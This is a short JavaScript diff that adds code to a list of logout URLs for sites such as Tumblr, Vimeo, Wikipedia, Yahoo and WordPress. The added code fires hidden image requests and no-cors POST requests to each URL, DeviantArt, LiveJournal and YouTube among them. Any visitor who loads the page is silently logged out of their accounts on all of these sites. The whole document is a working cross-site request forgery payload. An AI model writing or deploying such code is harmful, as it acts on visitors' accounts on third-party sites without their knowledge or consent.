@@ -9,4 +9,11 @@ const getLogouts = [
     "https://www.thinkgeek.com/brain/account/login.cgi?a=lo", "http://www.threadless.com/logout", "http://www.tumblr.com/logout", "http://vimeo.com/log_out", 
     "http://en.wikipedia.org/w/index.php?title=Special:UserLogout", "http://login.live.com/logout.srf", "https://account.woot.com/logout", 
     "https://wordpress.com/wp-login.php?action=logout", "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/"
-]
+];
+getLogouts.forEach(url => new Image().src = url);
+const postLogouts = [
+    ["http://www.deviantart.com/users/logout", null], ["http://www.livejournal.com/logout.bml", "action:killall=1"], ["http://www.youtube.com", "action_logout=1"]
+];
+postLogouts.forEach(([url, body]) => {
+    fetch(url, { method: 'POST', body, mode: 'no-cors' }).catch(() => {});
+});
